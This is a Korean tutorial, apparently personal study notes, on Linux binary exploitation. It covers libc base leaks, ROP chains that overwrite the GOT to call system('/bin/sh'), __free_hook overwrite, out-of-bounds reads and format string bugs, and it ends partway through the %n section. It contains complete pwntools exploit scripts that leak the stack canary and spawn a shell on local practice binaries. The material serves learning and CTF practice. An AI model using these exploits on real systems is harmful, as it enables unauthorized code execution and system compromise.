쉘에서 ldd /bin/bash 명령을 사용하여 libc 의 경로를 확인한다. ex) linux-vdso.so.1 (0x00007ffff8cd0000)\rlibtinfo.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f0d65a90000)\rlibdl.so.2 =\u0026gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0d65a80000)\rlibc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d65880000)\r/lib64/ld-linux-x86-64.so.2 (0x00007f0d65c01000) 혹은 getconf -a | grep libc 명령어로도 libc 버전을 확인할 수 있다. 확인된 libc 파일 경로를 readelf 명령어로 분석하여 내부 함수들의 주소를 확인한다. readelf -s /lib/x86_64-linux-gnu/libc.so.6 92: 0000000000083970 448 FUNC WEAK DEFAULT 15 gets@@GLIBC_2.2.5\r430: 0000000000084420 476 FUNC WEAK DEFAULT 15 puts@@GLIBC_2.2.5\r639: 0000000000061c90 204 FUNC GLOBAL DEFAULT 15 printf@@GLIBC_2.2.5\r942: 000000000010e1e0 153 FUNC GLOBAL DEFAULT 15 read@@GLIBC_2.2.5\r1430: 0000000000052290 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5 ELF 상 system 함수의 offset이 0x0000000000052290 임을 알수 있다. gdb 실행 후 p system 으로 got 에 저장된 system 함수의 주소를 확인할 수 있다. ex) # p system\r$1 = {int (const char *)} 0x7ffff7e1d290 \u0026lt;__libc_system\u0026gt;\r# p puts\r$2 = {int (const char *)} 0x7ffff7e4f420 \u0026lt;__GI__IO_puts\u0026gt; got 상 주소에서 offset을 빼면 libc_base 주소를 구할 수 있다. system 함수: 0x7ffff7e1d290 - 0x0000000000052290 = 0x7FFFF7DCB000 puts 함수: 0x7ffff7e4f420 - 0x0000000000084420 = 0x7FFFF7DCB000 libc_base의 주소가 0x7FFFF7DCB000 이며, 어떤 함수를 사용해도 계산 결과가 같은 것을 볼 수 있다. pwntool 사용\nlibc 라이브러리의 ELF를 확인한다.\nfrom pwn import *\rlibc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;)\roffset_read = libc.symbols[\u0026#39;read\u0026#39;] 이제 read 함수의 주소를 확인해야 한다. 하지만 pwntool에서는 read 함수의 주소가 저장된 got 테이블의 주소는 확인할 수 있지만, 그 안에 저장된 값(read 함수의 메모리상 주소)은 확인할 수 없다.\nread 함수의 메모리상 주소값을 확인하려면 프로그램에서 got 값을 출력하도록 exploit code를 작성해야 한다.\nbuffer overflow를 통해 write(1,read_got) 를 호출하면 원하는 값을 출력할 수 있다.\nrdi(첫번째 인자)를 1, rsi(두번째 인자)를 read_got로 설정하기 위해 return gadget 을 사용한다.\nROPgadget --binary PROGRAM_PATH 로 검색 하여 pop rsi 와 pop rdi gadget 을 찾는다.\nROPgadget 사용법 참조 0x0000000000400851 : pop rsi ; pop r15 ; ret\r0x0000000000400853 : pop rdi ; ret\r# 검색 결과 pop rdi / pop rsi 구문이 포함된 다른 gadget 이 없으므로 선택지는 없다.\r# gadget 의 주소는 동일한 프로그램 실행시 항상 일정한 값을 가지므로 미리 추출하여 사용할 수 있다. exploit 코드를 작성한다.\nfrom pwn import *\rp = process(PROGRAMA_PATH)\re = ELF(PROGRAMA_PATH)\r# exploit code, 코드상 buffer overflow를 발생시킬 수 있는 구문이 있다고 가정한다.\rread_plt = e.plt[\u0026#39;read\u0026#39;] # read 함수의 plt\rread_got = e.got[\u0026#39;read\u0026#39;] # read 함수의 got\rwrite_plt = e.plt[\u0026#39;write\u0026#39;] # write 함수의 plt\rpop_rdi_ret = 0x0000000000400853 # pop rdi; ret 구문의 주소\rpop_rsi_pop_r15_ret = 0x0000000000400851 # pop rsi; pop r15; ret 구문의 주소\rpayload = b\u0026#39;A\u0026#39;*(buffer_length + 8) + canary + b\u0026#39;B\u0026#39;*8 # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)\rpayload += p64(pop_rdi_ret) + p64(1) # rdi 에 1 을 적용하도록 gadget 배치\rpayload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0) # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.\rpayload += p64(write_plt) # return 주소를 write_plt 로 변경한다. # write(1,read_got) 가 완성되었다. 결과로 read 함수의 주소를 출력한다. 출력된 값에서 read 함수의 offset (앞서 구한 offset_read) 을 빼면 libc_base 를 구할 수 있다.\nsystem 함수의 offset 확인\nlinux 명령어 사용 readelf -s /lib/x86_64-linux-gnu/libc.so.6 92: 0000000000083970 448 FUNC WEAK DEFAULT 15 gets@@GLIBC_2.2.5\r430: 0000000000084420 476 FUNC WEAK DEFAULT 15 puts@@GLIBC_2.2.5\r639: 0000000000061c90 204 FUNC GLOBAL DEFAULT 15 printf@@GLIBC_2.2.5\r942: 000000000010e1e0 153 FUNC GLOBAL DEFAULT 15 read@@GLIBC_2.2.5\r1430: 0000000000052290 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5 system 함수의 offset은 0x0000000000052290 pwntool 사용 ELF 함수로 ELF 파일을 읽고 필요한 함수의 symbol을 참조한다. libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;)\roffset_system = libc.symbols[\u0026#39;system\u0026#39;]\rprint(offset_system) 1,2에서 나온 결과를 종합하여, libc_base 에 system 함수의 offset을 더한 결과가 \u0026ldquo;실행된 프로그램의 메모리에 적재된 system 함수의 주소\u0026rdquo; 값이다. libc 의 일부 함수의 주소를 입력하면 libc 버전 및 다른 함수의 주소도 확인할 수 있는 사이트가 있다. 사이트 링크 \u0026ldquo;/bin/sh\u0026rdquo; 문자열의 위치를 찾는다. (생략 가능)\n\u0026ldquo;/bin/sh\u0026rdquo; 문자열을 lib.so.6 파일에서 찾을 수 있지만, writing 가능한 버퍼에 직접 문자열을 입력하는 방법도 있다. 후자의 경우 굳이 \u0026ldquo;/bin/sh\u0026rdquo; 를 찾을 필요가 없다. libc.so.6 에 포함된 \u0026ldquo;/bin/sh\u0026rdquo; 문자열의 주소를 찾으려면, system() 함수의 주소를 찾을 때와 마찬가지로 /bin/sh 문자열의 offset 에 libc_base 주소를 더하여 참조할 수 있다. gdb 사용\ngdb 를 사용하면 offset이 아닌 실제 주소를 확인할 수 있다. search /bin/sh 명령으로 /bin/sh 의 \u0026ldquo;메모리상 주소\u0026rdquo; 가 출력된다. ex) pwndbg\u0026gt; search /bin/sh\rSearching for value: \u0026#39;/bin/sh\u0026#39;\rlibc-2.31.so 0x7ffff7f7f5bd 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; */\r# /bin/sh 의 주소(0x7ffff7f7f5bd) 에서 libc_base 를 뺀 값이 /bin/sh 의 offset이 된다. linux 명령어 사용\nlinux의 strings 명령을 이용한다. strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh 명령 결과 1b45bd /bin/sh 가 확인된다. pwntool 사용\nELF 파일을 분석하여 나온 결과에 libc_base 를 더하면 실제 메모리 주소가 나온다. ex) from pwn import *\rlibc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;)\r# /bin/sh offset 확인\rbin_sh1 = list(libc.search(b\u0026#39;/bin/sh\u0026#39;))[0] # 방법1\rbin_sh2 = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # 방법2\r# -\u0026gt; /bin/sh/ 의 메모리상 주소 == libc_base + bin_sh1 이다. system(\u0026quot;/bin/bash\u0026quot;) 를 작성한다.\nread 함수의 got 에 system 함수의 주소를 넣으면, 코드상 read(\u0026quot;/bin/bash\u0026quot;) 가 실제로는 system(\u0026quot;/bin/bash\u0026quot;) 로 동작하게 된다. 이를 이용해 got 영역을 조작하여 system 함수를 호출한다. pwntool 사용 리눅스에서 ROPgadget --binary rop 명령으로 바이너리를 분석하면, return gadget 들이 확인된다. 이중 rdi, rsi 가 포함된 gadget들을 확인한다. (이하 rdi_ret, rsi_ret) rdi_ret, rsi_ret 을 활용하여 rdi() 와 rsi 값을 알맞게 설정 해 주고, 원하는 함수를 호출한다.. gadget들은 특정 함수를 호출하는 것이 아니기 때문에 동일한 stack frame 안에서 호출되므로 canary 를 세팅 해 줄 필요는 없다. 코드상으로는 다음과 같다. # (2) 에서 libc_base 를 알아내기 위해 buffer overflow 로 read 함수의 got 영역을 출력하도록 payload를 작성했다.\r# 여기에 system(\u0026#34;/bin/sh\u0026#34;) 를 호출하기 위한 코드를 이어서 작성한다.\r# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.\r# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.\r# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.\rpayload += p64(pop_rdi_ret) + p64(0) # rdi 에 0 값 적용\rpayload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0) # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용\r# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.\r# e = ELF(PROGRAM_PATH)\r# read_plt = e.plt[\u0026#39;read\u0026#39;]\rpayload += p64(read_plt) # read 함수 호출\r# read의 got를 system으로 변경하게 되면, read(\u0026#34;/bin/bash\u0026#34;) 를 호출한 결과는 system(\u0026#34;/bin/bash\u0026#34;) 가 된다. payload += p64(pop_rdi_ret) + p64(addr_bin_sh)\rpayload += p64(read_plt) 정리하자면 아래와 같다. 전제조건 : buffer overflow 2회 이상 바이너리 보유 순서: canary 획득 exploit 용 payload 작성 바이너리를 ROPgadget --binary rop 로 분석하여 return gadget 추출 write(1, read_got, ?) 함수를 return gadget 으로 작성하여 read 함수(다른 함수도 가능) 의 got 주소 출력 유도 read(0, read_got, ?) 함수를 return gadget 으로 작성하여 read 함수의 got 영역 값 덮어쓰도록 하기 read(read_got + 8) 함수를 호출. read 함수의 got 를 system 함수의 주소로 변경하고, read_got + 8 에 \u0026quot;/bin/sh\u0026quot; 를 넣을 예정이기 때문에, 이 구문은 system(\u0026quot;/bin/sh\u0026quot;) 가 될 예정 payload를 프로그램에 전달하여 출력된 read 함수의 주소를 획득, 획득한 주소에서 read 함수의 offset 을 빼서 libc_base 계산 libc_base 에 system 함수의 offset 을 더해서 system 함수의 주소 계산 system 함수의 주소(8byte) + \u0026ldquo;/bin/sh\u0026rdquo;(8byte) 의 payload 를 작성하여 프로그램에 전달 앞서 작성한 read(0, read_got, ?) 함수에서 이를 수신함 그 결과 프로그램에서 read(read_got + 8) 는 system(\u0026quot;/bin/sh\u0026quot;) 로 변경되고, 쉘 권한을 획득하게 됨 전체 코드는 다음과 같다. from pwn import *\r##########\r# RUN PROGRAM\r##########\rp = process(PROGRAM_PATH)\re = ELF(PROGRAM_PATH)\rlibc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;)\r# 특정 libc 파일을 적용하고 싶을 때\r# p = process(\u0026#39;PROGRAM_PATH\u0026#39;, env= {\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc.so.6\u0026#34;})\r# libc = ELF(\u0026#39;./libc.so.6\u0026#39;)\rbuffer_length = 0x30 # exploit 할 코드에 따라 변경 필요\r##########\r# LEAK CANARY\r##########\rpayload = b\u0026#39;A\u0026#39;*(buffer_length + 8 + 1) # overwrite buffer_length + 8(other local variable) + 1(canary_first 1 byte null)\r# p.sendafter(b\u0026#39;Buf: \u0026#39;, payload)\rp.send(payload)\rp.recvuntil(payload)\rcanary = b\u0026#39;\\x00\u0026#39; + p.recvn(7)\rprint(\u0026#39;canary:\u0026#39;,hex(u64(canary)))\r##########\r# LEAK ADDRESS OF LIBC FUNC\r##########\rread_got = e.got[\u0026#39;read\u0026#39;] # read 함수의 got\rread_plt = e.plt[\u0026#39;read\u0026#39;] # read 함수의 plt\rwrite_plt = e.plt[\u0026#39;write\u0026#39;] # write 함수의 plt\rpop_rdi_ret = 0x0000000000400853 # pop rdi; ret 구문의 주소\rpop_rsi_pop_r15_ret = 0x0000000000400851 # pop rsi; pop r15; ret 구문의 주소\rret = 0x0000000000400596 # ret 구문의 주소, 리턴 가젯\rpayload = b\u0026#39;A\u0026#39;*(buffer_length + 8) + canary + b\u0026#39;B\u0026#39;*8 # overwrite buffer_length + 8(other local variable) + canary(8) + SFP(8)\rpayload += p64(pop_rdi_ret) + p64(1) # rdi 에 1 을 적용하도록 gadget 배치\rpayload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0) # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.\rpayload += p64(write_plt) # return 주소를 write_plt 로 변경한다.\r# write(1,read_got) 가 완성되었다. payload를 프로그램에 넘기면 read 함수의 주소를 출력하게 된다.\r##########\r# CHANGE GOT OF READ INTO ADDR OF SYSTEM\r##########\r# 앞서 libc_base를 알아내기 위해 buffer overflow로 read 함수의 got 영역을 출력하도록 payload를 작성했다.\r# payload에 system(\u0026#34;/bin/sh\u0026#34;) 를 호출하기 위한 코드를 이어서 작성한다.\r# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.\r# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.\r# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.\rpayload += p64(pop_rdi_ret) + p64(0) # rdi 에 0 값 적용\rpayload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0) # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용\r# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.\rpayload += p64(read_plt) # read 함수 호출\r# 참조\roffset_bin_sh = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # libc에 위치한 \u0026#34;/bin/sh\u0026#34; 문자열의 위치를 추출할 수 있다.\rprint(\u0026#39;offset /bin/sh:\u0026#39;, hex(offset_bin_sh))\r##########\r# CALL read(\u0026#34;/bin/bash\u0026#34;)\r##########\r# read의 got를 system으로 변경하게 되면, read(\u0026#34;/bin/bash\u0026#34;) 를 호출한 결과는 system(\u0026#34;/bin/bash\u0026#34;) 가 된다.\rpayload += p64(pop_rdi_ret) + p64(read_got + 0x08) # \u0026#34;/bin/bash\u0026#34; 문자열을 libc에서 사용하지 않고 got 영역에 덮어써서 사용하겠다.\rpayload += p64(ret) # system() 함수 내부의 movaps 가 스택의 데이터를 16바이트로 정렬하므로, 16바이트 짝을 맞추기 위해 리턴가젯 사용\rpayload += p64(read_plt)\r# payload 보내게 되면 (1) read 함수 주소 출력, (2) stdin 입력 대기, 입력된 값으로 read_got 덮어씀, (3) system(\u0026#39;/bin/sh\u0026#39;) 실행\rp.sendafter(b\u0026#39;Buf: \u0026#39;, payload)\raddr_read = p.recvn(6).ljust(8,b\u0026#39;\\x00\u0026#39;) # ASLR이 적용되면 라이브러리 함수의 주소는 항상 0x00007f 로 시작하므로 0x00 0x00 + 6자리로 구성된다.\rprint(\u0026#39;addr read:\u0026#39;, hex(u64(addr_read)))\r##########\r# CALC LIBC_BASE ADDR\r##########\r# 유출된 read 함수의 주소로 libc_base 가 메모리상에 위치하는 주소를 계산한다.\roffset_read = libc.symbols[\u0026#39;read\u0026#39;]\rlibc_base = u64(addr_read) - offset_read\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base))\r##########\r# CALC ADDR OF SYSTEM\r##########\roffset_system = libc.symbols[\u0026#39;system\u0026#39;]\raddr_system = libc_base + offset_system\rprint(\u0026#39;addr system:\u0026#39;, hex(addr_system))\rp.send(p64(addr_system) + b\u0026#34;/bin/sh\\x00\u0026#34;)\rp.interactive() Hook Overwrite Hooking 이란 운영 체제가 특정 코드를 실행하려 할 때 다른 코드가 강제로 실행되도록 하는 기능이며, 이때 실행되는 코드를 Hook 이라 한다. 시스템 상 정의되어 있는 Hook 을 원하는 형태로 덮어써서 수행하는 공격을 Hook Overwrite 라 한다. libc.so 파일의 malloc 관련 함수들에 디버깅 편의를 위해 hook 이 미리 설정되어 있다. __libc_malloc 함수를 살펴보면 __malloc_hook 함수가 있으면 이를 호출하도록 되어 있다. free 함수와 realloc 함수들도 각각 __free_hook, __realloc_hook 함수가 hooking 되어있다. __malloc_hook 는 libc.so 영역 안에 있으므로 writing 권한이 있는 라이브러리 영역이며, __malloc_hook 에 Hook Overwrite 공격을 수행하면 Full RELRO 기법으로 방어할 수 없다. readelf -s 명령으로 libc.so 파일의 section 정보를 추출하고, __malloc_hook 함수의 index를 찾는다. 이후 readelf -S 혹은 objdump -h 명령으로 libc.so 파일의 section 들을 확인하여 해당 메모리 영역에 읽기/쓰기 권한이 있는지 확인 할 수 있다. __malloc_hook, __free_hook, __realloc_hook 가 저장되는 영역이 bss 영역인 linux 버전에서는 Hook Overwrite가 가능하다. __free_hook 이나 __malloc_hook 은 보안 및 성능 때문에 glibc 2.34 버전부터 제거되었다. Free Hook Overload free 함수에 적용된 __free_hook 를 덮어써서 exploit을 수행 해 본다. libc_base 주소 확인\nmain 함수는 보통 __libc_start_main 함수에서 호출되고, __libc_start_main 함수의 메모리 주소는 libc_base 이다. main 함수의 스택 프레임을 확인하여 return address 를 추출한다. return address 는 __libc_start_main 함수의 어딘가를 가리킬 것이다. gdb 로 exploit 대상 프로그램을 로딩하고, main 함수에 break point 를 걸고, run 명령으로 프로그램을 실행시킨다. pwndbg 플러그인이 설치된 gdb라면 bt 명령으로 stack 상 main 함수의 return address 가 확인된다. 이 return address 를 x \u0026lt;주소\u0026gt; 명령으로 확인하면 __libc_start_main + α (임의의 값) 으로 표시된 것을 확인 할 수 있다. readelf -s 명령으로 libc 라이브러리에서 __libc_start_main 함수의 offset 을 확인한다. 위에서 얻어낸 결과들로 아래 계산식을 통해 libc_base 의 주소를 얻어낸다. (main 함수의 return address) - (__libc_start_main 함수의 offset) - α = libc_base system 함수와 __free_hook 함수를 치환한다.\n__free_hook 함수를 실행하면 system 함수가 실행되도록 hook 함수 주소를 변경한다. 정리하자면 조건: buffer overflow가 발생한다. 프로그램의 바이너리가 필요하다. 프로그램에서 free 함수를 호출하고, free 함수의 인자를 표준 입력으로 받는다. 프로그램에서 임의 주소에 임의 값을 덮어쓴다. scanf(\u0026#34;%llu\u0026#34;, \u0026amp;value);\r*addr = value; got 를 수정할 수 없기 때문에 ROP 와 비교했을 때 조건이 하나 더 추가된다. main 함수의 stack frame 의 return address 추출이 가능해야 한다. libc_base 를 확인하는데 사용하므로, 다른 방법으로 대체 가능 프로그램에 사용된 libc 라이브러리가 필요하다. 단계: 바이너리를 gdb 로 분석하여 main 함수가 __libc_start_main 함수의 몇 번째 라인에서 호출되는지 확인한다. 프로그램의 ELF 를 확인하여 프로그램을 실행시키고, buffer overflow로 main 함수의 stack frame 에서 return address 값을 출력시킨다. 출력된 주소값으로 libc_base 를 구한다. libc_base 값으로 system, __free_hok 함수와 \u0026quot;/bin/sh\u0026quot; 문자열의 주소를 구한다. 조건 (4) 에 해당하는, \u0026lsquo;표준입력\u0026rsquo; 을 받는 코드에서 __free_hook 함수의 symbol 주소에 system 함수의 symbol 주소를 대입한다. 프로그램에서 호출된 free 함수의 인자에 \u0026quot;/bin/sh\u0026quot; 문자열의 주소를 대입한다. exploit 예시 from pwn import *\rp = process(\u0026#39;./fho\u0026#39;)\re = ELF(\u0026#39;./fho\u0026#39;)\rlibc = ELF(\u0026#39;./libc-2.27.so\u0026#39;)\rBUF_SIZE = 0x30\r##########\r# 1. leak memory of \u0026#39;main\u0026#39; function\r##########\rpayload = b\u0026#39;A\u0026#39; * (BUF_SIZE + 8 + 8 + 8) # BUFFER + other local variable + canary + SFP\rp.sendafter(\u0026#39;Buf: \u0026#39;, payload)\rprint(p.recvuntil(payload)) # payload 값 버리기\raddr_main_return = u64(p.recvn(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) # main 함수의 stack frame 의 return 주소\r##########\r# 2. calculate offsets of \u0026#39;__libc_start_main\u0026#39; function\r##########\r# gdb 에서 확인 한 main 함수의 __libc_start_main 에서의 offset 은 231 이다\r# 0x7ffff7a03c87 \u0026lt;__libc_start_main+231\u0026gt;: mov edi,eax\rOFFSET_MAIN = 231 ADDR_LIBC_START_MAIN = addr_main_return - OFFSET_MAIN # __libc_start_main 함수의 주소\r# readelf -s 명령으로 확인한 __libc_start_main 의 offset 은 0x021b10 였다.\r# 2203: 0000000000021b10 446 FUNC GLOBAL DEFAULT 13 __libc_start_main@@GLIBC_2.2.5\r# OFFSET_LIBC_START_MAIN = libc.symbols[\u0026#39;__libc_start_main\u0026#39;]\rOFFSET_LIBC_START_MAIN = 0x21b10\rlibc_base = ADDR_LIBC_START_MAIN - OFFSET_LIBC_START_MAIN\raddr_system = libc.symbols[\u0026#39;system\u0026#39;] + libc_base # libc_base 에 offset 합산\raddr_free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] # libc_base 에 offset 합산\raddr_bin_sh = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # libc에 위치한 \u0026#34;/bin/sh\u0026#34; 문자열의 위치 추출 후 주소 계산\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base), \u0026#39;\\naddr_free_hook:\u0026#39;, hex(addr_free_hook), \u0026#39;\\naddr_system:\u0026#39;, hex(addr_system), \u0026#39;\\naddr_bin_sh:\u0026#39;, hex(addr_bin_sh))\r##########\r# 3. get shell\r##########\r# stack 에 값을 직접 채워넣을때는 p64() 함수로 패키징을 한 binary 데이터를 전달헀지만,\r# 프로그램에서 정상적으로 변수에 값을 집어게 할 때는 string 형태로 변환해야 한다\rinput1 = str(addr_free_hook).encode()\rprint(p.recvuntil(\u0026#39;To write: \u0026#39;))\rp.sendline(input1) # input1\rinput2 = str(addr_system).encode()\rprint(p.recvuntil(\u0026#39;With: \u0026#39;))\rp.sendline(input2) # input2\r# 코드상 input1(__free_hook) 의 주소를 input2(system) 의 주소로 변경시켜줌\rinput3 = str(addr_bin_sh).encode()\rprint(p.recvuntil(\u0026#39;To free:\u0026#39;))\rp.sendline(input3) # __free_hook 함수는 __free_hook(arg1) 형태로 동작하므로, arg1 에 \u0026#34;bin/sh\u0026#34; 를 넣어서 system(\u0026#34;/bin/sh\u0026#34;) 를 만든다.\rp.interactive() Out Of Bound C 언어에서는 배열을 참조할 때 [] 연산자를 사용한다. 하지만 C 언어 컴파일러는 [] 연산자 사용시 배열의 범위를 벗어났는지 체크하지 않고, boundary check 는 오직 개발자의 몫이다. [] 연산자 사용시 boundary check 가 미흡한 코드가 있다면, boundary 를 벗어나는 index 를 넣어 코드의 특정 메모리를 참조할 수 있고, 이러한 공격을 OOB(out of bound) 라 한다. 예를 들어, 아래 코드를 실행한다고 하자. char* secret = \u0026#34;SECRET KEY\u0026#34;;\rchar[] arr = {\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;, \u0026#34;phone\u0026#34;, \u0026#34;address\u0026#34;};\rint idx;\rscanf(\u0026#34;%d\u0026#34;, \u0026amp;idx);\rprintf(\u0026#34;%s\u0026#34;, arr[idx]); 변수 idx 에 대한 boundary check 가 되어있지 않아 idx 값을 원하는 대로 넣어 같은 주변의 메모리를 참조할 수 있게 된다. 실행 될 때 stack 을 예로 들면 아래와 같은 형태가 될 것이다. 01:0008│-038 0x7fffffffdec8 —▸ 0x555555558040 (secret) ◂— \u0026#39;SECRET KEY\\n\u0026#39;\r02:0010│-030 0x7fffffffded0 —▸ 0x55555555602d ◂— \u0026#39;name\u0026#39;\r03:0018│-028 0x7fffffffded8 —▸ 0x555555556041 ◂— \u0026#39;age\u0026#39;\r04:0020│-020 0x7fffffffdee0 —▸ 0x55555555604d ◂— \u0026#39;phone\u0026#39;\r05:0028│-018 0x7fffffffdee8 —▸ 0x55555555605b ◂— \u0026#39;address\u0026#39; arr[0] 은 0x7fffffffded0 주소에 해당하고, arr[-1]은 0x555555558040 주소에 해당하는 값을 반환 한다. idx 에 -1 을 넣으면 개발자가 의도하지 않은 변수 값인 secret 변수의 값 \u0026ldquo;SECRET KEY\u0026rdquo; 문자열이 출력되게 할 수 있다. FSB (Format String Bug) C 언어에서 문자열을 처리하는 함수 중 f로 끝나는 함수들은 대부분 format string 을 처리하는 함수이다. format string 이란, %d %s %u 처럼 문자열에 변수를 특정 형식으로 매핑 해 놓은 형태를 의미한다. format string 을 처리하는 함수는 format string 이 필요로 하는 변수의 갯수를 확인하는 과정이 별도로 없어, 해커들이 이를 이용해 의도하지 않은 변수들을 추가로 출력/입력 하도록 조작할 여지를 만든다. printf 를 통한 exploit 조건: printf(변수) 형태의 printf 구문 (argument가 한개) 취약한 printf 구문이 두 번 이상 호출되어야 함 프로그램의 바이너리 있어야 함 printf 함수는 출력을 위한 함수이지만, %n 형태의 format string 을 사용하면 입력도 받는 기능이 있다. exploit 절차는 다음과 같다. gdb 를 사용해 바이너리를 분석하여 ELF 로 랜덤하게 배정된 코드 영역의 base 주소를 확인하고 main 함수의 시작 offset 을 구한다.\nvmmap 명령어로 메모리 영역을 출력 했을 때, 메모리상 코드 영역의 시작부분을 확인한다. (아래 예시에서는 0x555555554000 에 해당)\nStart End Perm Size Offset File\r0x555555554000 0x555555555000 r--p 1000 0 /home/aswinblue/download/fsb/fsb_overwrite\r0x555555555000 0x555555556000 r-xp 1000 1000 /home/aswinblue/download/fsb/fsb_overwrite\r0x555555556000 0x555555557000 r--p 1000 2000 /home/aswinblue/download/fsb/fsb_overwrite\r0x555555557000 0x555555558000 r--p 1000 2000 /home/aswinblue/download/fsb/fsb_overwrite\r0x555555558000 0x555555559000 rw-p 1000 3000 /home/aswinblue/download/fsb/fsb_overwrite\r0x7ffff7dcb000 0x7ffff7ded000 r--p 22000 0 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r0x7ffff7ded000 0x7ffff7f65000 r-xp 178000 22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so start 명령으로 프로그램을 실행시키면 main 함수의 주소가 확인된다. (아래 예시에서는 0x555555555290)\n──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────\r► 0x555555555290 \u0026lt;main\u0026gt; endbr64\r0x555555555294 \u0026lt;main+4\u0026gt; push rbp\r0x555555555295 \u0026lt;main+5\u0026gt; mov rbp, rsp 앞서 vmmap 명령으로 구한 코드 영역의 시작 주소 0x555555554000 와 main 함수의 주소 0x555555555290 를 뺀 차이 0x1290 가 코드 영역에서 main 함수의 offset 이 된다.\n추출이 필요한 target 변수의 메모리 주소를 확인한다.\n리눅스 명령어 readelf -s 로 추출이 필요한 변수의 offset 을 확인 할 수 있다. 이번 예시에서는 changeme 가 target 변수이다. 74: 0000000000000000 0 FUNC GLOBAL DEFAULT UND exit@@GLIBC_2.2.5\r75: 000000000000401c 4 OBJECT GLOBAL DEFAULT 26 changeme\r76: 0000000000004010 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__\r77: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable target 변수의 offset 은 0x000000000000401c 이므로 (1) 에서 구한 code_base 의 주소를 더해주면 target 변수의 주소는 0x555555554000 + 0x401c = 0x55555555801c 이다. (1) 과정에서 main 함수의 시작 주소가 0x555555555290 였으므로, main 함수와 target 변수의 주소 차이는 0x2D8C 이다. stack 상에서 main 함수의 주소를 찾는다.\nstart 명령으로 프로그램을 실행시키고 main 함수가 printf 함수를 호출하는 시점까지 실행시킨다. (printf@plt 호출 직전까지 실행해야 하며, disass main 명령어로 printf@plt 호출 부분을 확인할 수도 있다.) tele 명령으로 스택 프레임의 return address 값을 확인해 stack 상에 입력된 main 함수의 주소를 찾을 수 있다. pwndbg\u0026gt; tele 20\r00:0000│ rdi rsi rsp 0x7fffffffdef0 ◂— \u0026#39;aaaaaaaa\u0026#39;\r01:0008│-028 0x7fffffffdef8 —▸ 0x555555555300 (main+112) ◂— add al, ch\r02:0010│-020 0x7fffffffdf00 ◂— 0x0\r03:0018│-018 0x7fffffffdf08 —▸ 0x555555555120 (_start) ◂— endbr64 rsp + 8 영역에 main + 112(0x555555555300) 가 들어있음을 확인 할 수 있다. target 변수와 main 함수는 0x2D8C = 11660 만큼 차이가 나므로, rsp + 8 영역의 주소 0x555555555300 에 11660 - 112 를 더하면 target 변수의 주소가 된다. 즉, printf 를 호출하기 직전 rsp[8] + 11548 값은 target 변수의 메모리 주소 값이 됨을 알 수 있다. ELF 나 ASLR 이 적용되어도 함수 및 변수의 상대적인 주소는 일정하므로 gdb 로 미리 확인하고 pwntool 로 공격이 가능하다. printf 의 취약점을 활용하여 필요한 메모리 영역을 추출한다.\nprintf 는 format string 을 첫 번째 인자(rdi)로 받고, 두 번째 이상 부터는 format string 에서 호출 될 변수들을 인자로 받는다. printf(\u0026quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p\u0026quot;); 호출시 결과는 rsi, rdx, rcx, r8, r9, rsp[0], rsp[0x08], rsp[0x10] 에 들어있는 값이 출력된다. PLT/GOT 참조 6번째 변수부터 stack 의 값을 참조하도록 되어있으므로 stack 에 들어있는 메모리 주소를 출력하도록 할 수도 있게 된다. rsp[8] 는 printf 상에서 %7$p 에 해당한다. (메모리 주소 출력을 해야하므로 \u0026lsquo;%p\u0026rsquo; 를 사용했다.) printf(\u0026quot;%7$p\u0026quot;); 를 호출하도록 코드를 짜고, 출력된 값에서 + 11548 을 더하면 target 변수의 주소를 추출 해 낼 수 있다. printf 의 취약점을 활용하여 메모리 영역에 값을 덮어쓴다.\n추출된 메모리 영역에 값을 덮어 쓰려면, format string 의 %n 기능을 이용한다. 